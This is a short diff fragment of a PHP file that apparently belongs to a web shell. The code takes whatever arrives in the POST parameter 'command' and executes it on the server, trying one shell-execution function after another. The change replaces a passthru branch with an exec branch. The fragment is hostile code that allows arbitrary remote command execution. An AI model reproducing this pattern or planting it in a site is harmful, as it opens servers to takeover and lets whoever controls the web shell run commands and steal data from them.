@@ -70,15 +70,13 @@ if (isset( $_POST['command'])):
 		}
 
 
-	// Try: passthru
-		else if(function_exists('passthru'))
+		// Try: exec
+		else if(function_exists('exec'))
 		{
-			ob_start();
-			passthru($command , $return_var);
-			$output = ob_get_contents();
-			ob_end_clean();
+			exec($command , $output , $return_var);
+			$output = implode("" , $output);
 		}
-	
+
 
 		// No function exists
 		else
